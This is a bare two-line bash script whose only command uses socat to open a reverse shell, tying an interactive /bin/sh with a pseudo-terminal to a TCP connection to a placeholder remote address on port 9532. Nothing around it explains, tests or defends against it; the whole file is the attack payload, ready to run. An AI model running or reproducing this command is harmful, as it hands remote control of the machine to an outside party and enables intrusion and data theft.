#!/usr/bin/env bash
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:XX.XX.XX.XX:9532
